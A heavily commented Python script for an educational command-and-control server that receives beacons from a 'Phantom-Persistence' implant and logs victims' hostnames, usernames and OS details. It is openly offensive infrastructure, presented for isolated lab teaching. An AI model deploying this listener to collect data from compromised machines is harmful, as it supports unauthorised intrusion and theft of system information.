
"""
Phantom-Persistence C2 Server
Educational Command & Control Server for receiving implant beacons

MITRE ATT&CK Techniques (Defender Perspective):
- T1071.001: Application Layer Protocol - Web Protocols
- T1041: Exfiltration Over C2 Channel
- T1082: System Information Discovery (data received)

WARNING: For educational use only in isolated lab environments
"""

# Bring in the stuff we need to make a web server
from http.server import HTTPServer, BaseHTTPRequestHandler

# Bring in tools to break apart URLs and read data from them
from urllib.parse import urlparse, parse_qs

# Bring in JSON so we can save data in an organized way
import json

# Bring in datetime so we know what time things happen
import datetime

# Bring in os for file stuff (not really used much here)
import os

# Configuration (the settings for our server)

# This is the address our server listens on - 0.0.0.0 means "listen everywhere"
C2_HOST = '0.0.0.0'  

# This is the door number (port) our server uses - like apartment 8080
C2_PORT = 8080

# This is the name of the file where we save all the beacon messages
LOG_FILE = 'c2_beacons.log'

# This is our custom class that handles when someone connects to our server
class C2Handler(BaseHTTPRequestHandler):
    """
    HTTP request handler for C2 server
    Processes beacon requests from implants
    """
    
    # This function controls how we print messages to the screen
    def log_message(self, format, *args):
        """Override to customize logging format"""
        
        # Get the current time right now and make it look nice
        timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        
        # Print the message with the time stamp in front of it
        print(f"[{timestamp}] {format % args}")
    
    # This function runs when someone sends a GET request (like clicking a link)
    def do_GET(self):
        """
        Handle GET requests from implant beacons
        Expected format: /beacon?hostname=X&user=Y&os=Z&implant=phantom-persistence
        """
        
        # Break apart the URL they sent us into pieces we can understand
        parsed_path = urlparse(self.path)
        
        # Check if they went to the /beacon page (that's where our implants send data)
        if parsed_path.path == '/beacon':
            # If yes, go process that beacon data
            self.handle_beacon(parsed_path)
        else:
            # If they went somewhere else, tell them "page not found" (404 error)
            self.send_response(404)
            # Finish sending the response
            self.end_headers()
    
    # This function processes the beacon data when an implant checks in
    def handle_beacon(self, parsed_path):
        """
        Process incoming beacon from implant
        Extract and log system information
        """
        
        # Pull out all the question mark stuff from the URL (like ?hostname=computer1)
        params = parse_qs(parsed_path.query)
        
        # Make a dictionary (like a list with labels) with all the beacon info
        beacon_data = {
            # Record exactly when this happened
            'timestamp': datetime.datetime.now().isoformat(),
            # Record what IP address sent this (first item in the address pair)
            'source_ip': self.client_address[0],
            # Get the computer name, or say "unknown" if we didn't get one
            'hostname': params.get('hostname', ['unknown'])[0],
            # Get the username, or say "unknown" if we didn't get one
            'username': params.get('user', ['unknown'])[0],
            # Get info about what operating system, or say "unknown"
            'os_info': params.get('os', ['unknown'])[0],
            # Get what implant sent this, or say "unknown"
            'implant': params.get('implant', ['unknown'])[0]
        }
        
        # Print this beacon info to the screen in a nice way
        self.log_beacon_console(beacon_data)
        
        # Save this beacon info to a file so we have a record
        self.log_beacon_file(beacon_data)
        
        # Tell the implant "I got your message" by sending back a 200 OK
        self.send_response(200)
        # Tell them we're sending back plain text
        self.send_header('Content-type', 'text/plain')
        # Finish the headers
        self.end_headers()
        # Actually send the word "OK" back to them
        self.wfile.write(b'OK')
    
    # This function prints the beacon data to the screen in a pretty way
    def log_beacon_console(self, data):
        """Pretty print beacon data to console"""
        
        # Print a blank line then a line of equals signs
        print("\n" + "="*60)
        # Print the alert emoji and message
        print("!!!NEW BEACON RECEIVED!!!")
        # Print another line of equals signs
        print("="*60)
        # Print each piece of data on its own line with a label
        print(f"Timestamp:  {data['timestamp']}")
        print(f"Source IP:  {data['source_ip']}")
        print(f"Hostname:   {data['hostname']}")
        print(f"Username:   {data['username']}")
        print(f"OS Info:    {data['os_info']}")
        print(f"Implant:    {data['implant']}")
        # Print final line of equals signs and a blank line
        print("="*60 + "\n")
    
    # This function saves the beacon data to a file
    def log_beacon_file(self, data):
        """Append beacon data to log file in JSON format"""
        
        # Try to save the data (might fail if we can't write to the file)
        try:
            # Open the log file in "append" mode (add to the end, don't erase it)
            with open(LOG_FILE, 'a') as f:
                # Convert the data dictionary to JSON text and write it with a newline
                f.write(json.dumps(data) + '\n')
        # If something goes wrong...
        except Exception as e:
            # Print an error message telling us what broke
            print(f"[!] Error writing to log file: {e}")

# This is the main function that starts everything up
def main():
    """
    Start the C2 server
    """
    
    # Print a cool ASCII art banner to make it look professional
    print("""
    ╔═══════════════════════════════════════════════════════╗
    ║                                                       ║
    ║        Phantom-Persistence C2 Server v1.0             ║
    ║        Educational Malware Analysis Tool              ║
    ║                                                       ║
    ╚═══════════════════════════════════════════════════════╝
    """)
    
    # Print some startup messages to tell us what's happening
    print(f"[+] Starting C2 Server...")
    print(f"[+] Listening on {C2_HOST}:{C2_PORT}")
    print(f"[+] Beacon endpoint: http://{C2_HOST}:{C2_PORT}/beacon")
    print(f"[+] Logging to: {LOG_FILE}")
    print(f"[+] Press Ctrl+C to stop\n")
    
    # Make a tuple (unchangeable list) with our host and port
    server_address = (C2_HOST, C2_PORT)
    
    # Create the actual HTTP server using our address and our custom handler
    httpd = HTTPServer(server_address, C2Handler)
    
    # Try to run the server...
    try:
        # Start the server and keep it running forever (until we stop it)
        httpd.serve_forever()
    # If the user presses Ctrl+C...
    except KeyboardInterrupt:
        # Print a message saying we're shutting down
        print("\n[!] Shutting down C2 server...")
        # Actually shut down the server
        httpd.shutdown()
        # Print a final message
        print("[+] Server stopped")

# If this file is being run directly (not imported)...
if __name__ == '__main__':
    # Run the main function to start everything
    main()